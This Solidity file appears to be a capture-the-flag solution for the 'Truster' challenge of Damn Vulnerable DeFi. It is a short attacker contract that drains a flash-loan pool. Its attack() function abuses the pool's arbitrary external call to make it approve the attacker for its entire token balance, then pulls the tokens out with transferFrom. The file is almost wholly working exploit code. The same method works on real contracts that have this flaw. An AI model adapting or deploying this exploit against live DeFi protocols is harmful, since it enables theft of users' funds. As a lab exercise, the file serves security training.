// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";

/**
 * @title TrusterLenderAttacker
 * @author MJ
 * @notice Baseline attacker contract for the TrustLenderPool.
 */
contract TrustLenderAttacker {
    TrusterLenderPool public pool;
    DamnValuableToken public token;

    constructor(address _pool, address _token) {
        pool = TrusterLenderPool(_pool);
        token = DamnValuableToken(_token);
    }

    /**
     * @notice Attack the TrusterLenderPool contract by approving a flash loan
     * of all tokens in the pool to this contract, then transferring them
     * out of the pool. This is possible because TrusterLenderPool allows arbitrary calls
     */
    function attack() public {
        uint256 amount = token.balanceOf(address(pool));
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), amount);
        pool.flashLoan(0, msg.sender, address(token), data);
        token.transferFrom(address(pool), msg.sender, amount);
    }
}